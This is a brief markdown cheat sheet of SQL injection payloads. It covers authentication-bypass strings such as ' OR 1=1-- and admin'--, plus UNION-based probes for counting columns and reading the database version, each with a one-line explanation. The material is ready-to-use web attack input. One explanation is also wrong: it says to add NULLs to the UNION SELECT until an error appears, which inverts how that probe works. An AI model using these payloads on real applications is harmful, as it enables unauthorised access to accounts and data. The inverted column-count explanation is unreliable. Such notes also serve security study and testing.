## SQLI-Query-Notes
### Authentication Bypass
```
● ' OR 1=1--                       : closes the current string ('), injects an always-true condition (OR 1=1), and comments out the remaining query (--)
● admin'--                         : uses admin as the username, closes the current string ('), and comments out the rest of the query (--)
```
### UNION-Based SQLI
```
● ' UNION SELECT NULL--            : used to determine the number of columns in an original sql query. Increment the number of NULL values until it shows an error, then the previous NULL count will be the column count
● ' ORDER BY 1--                   : used for the same purpose as the previous one(' UNION SELECT NULL--), here increment the numeric value
● ' UNION SELECT @@version, NULL-- :
  retrieves the database server version. The exact query varies depending on the database management system
```









